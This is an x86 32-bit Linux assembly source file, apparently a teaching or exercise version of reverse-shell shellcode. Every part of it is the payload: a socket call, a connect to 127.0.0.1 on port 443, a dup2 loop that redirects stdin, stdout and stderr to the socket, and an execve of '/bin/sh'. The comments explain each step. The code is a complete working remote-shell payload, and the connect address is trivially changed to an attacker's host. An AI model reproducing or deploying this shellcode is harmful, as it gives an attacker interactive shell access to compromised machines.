; socket = 0x167
; conneect = 0x16A
; dup2 = 0x3F
; execve = 0xB
; syscall numbers can be found here:
; /usr/include/i386-linux-gnu/asm/unistd_32.h

global _start
bits 32

_start:
        ; int3
socket:
        ; socket syscall
        xor eax, eax
        mov ax, 0167h

        ; param 1 = AF_INET = 0x02
        xor ebx, ebx
        mov bl, 02h

        ; param 2 = SOCK_STREAM = 0x01
        xor ecx, ecx
        mov cl, 01h

        ; param 3 = IPPROTO_IP = 0x00
        xor edx, edx

        ; make the call
        int 080h

        ; return value sockfd
        mov edi, eax

connect:
        ; clear eax and then move syscall into ax
        xor eax, eax
        mov ax, 016Ah

        ; move sockfd into ebx
        mov ebx, edi

        ; setting params in reverse order / little endian
        ; sin_addr
        push 0x0100007f
        ; sin_port
        push word 0BB01h
        ; sin_family
        push 02h

        ; second argument is a pointer to the struct
        ; esp now points to the struct on the stack
        ; set the pointer to ecx
        mov ecx, esp

        ; final argument is the length of thee struct
        ; length of the struct is 16 bytes
        xor edx, edx
        mov dl, 10h

        int 80h

; loop index init
xor esi, esi
loop:
        ; call dup2 in loop
        xor eax, eax
        mov al, 03Fh

        ; remember that we had sockfd in edi
        ; we send it as first argument into syscall
        mov ebx, edi

        ; esi was set to 0 before starting loop
        ; we are setting second param of loop to fd 0, 1, 2 as we go
        mov ecx, esi

        ; make syscall
        int 080h

        ; loop increment, check condition, jump
        inc esi
        cmp esi, 03h
        jne loop

execve:
        xor eax, eax
        mov al, 0Bh
        
        ; pushing string in reverse order - little endian
        push 0x0068732f
        push 0x6e69622f
        
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx

        int 080h
